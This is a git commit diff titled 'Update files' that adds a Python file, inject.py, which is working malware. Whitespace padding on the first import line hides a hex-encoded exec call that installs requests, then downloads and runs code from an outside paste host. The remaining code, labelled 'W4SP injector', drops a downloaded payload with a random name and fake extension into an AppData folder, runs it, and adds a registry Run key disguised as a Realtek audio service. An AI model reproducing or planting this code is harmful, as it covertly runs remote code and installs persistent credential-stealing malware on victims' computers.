bc5cea6288db62a48c91c5fb032d6ea50ec95938
conkeliard3649 <conkeliard3649@github.com>
2025-11-17 16:41:16 +0000

    Update files

---
+++ inject.py
@@ -0,0 +1,53 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x73\x61\x6c\x65\x6b\x2e\x63\x79\x2f\x70\x61\x73\x74\x65\x3f\x75\x73\x65\x72\x69\x64\x3d\x30\x27\x29\x2e\x74\x65\x78\x74\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x2f\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x29')
+from sys import executable
+from urllib import request
+from os import getenv, system, name, listdir
+from os.path import isfile
+import winreg
+from random import choice
+
+if name != 'nt': 
+    exit()
+
+# W4SP injector 1.1
+# by loTus04
+
+def getPath():
+    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
+    directory = listdir(path)
+    for _ in range(10):
+        chosen = choice(directory)
+        ye = path + "\\" + chosen
+        if not isfile(ye) and " " not in chosen:
+            return ye
+    return getenv("TEMP")
+
+def getName():
+    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
+    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
+    return firstName + choice(lasName)
+
+
+def install(path):
+    with open(path, mode='w', encoding='utf-8') as f:
+        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))
+
+def run(path):
+    system(f"start {executable} {path}")
+
+def startUP(path):
+    faked = 'SecurityHealthSystray.exe'
+    address = f"{executable} {path}"
+    key1 = winreg.HKEY_CURRENT_USER
+    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
+
+import contextlib
+DoYouKnowTheWay = getPath() + '\\' + getName()
+install(DoYouKnowTheWay)
+run(DoYouKnowTheWay)
+with contextlib.suppress(Exception):
+    startUP(DoYouKnowTheWay)
+
+print('u')
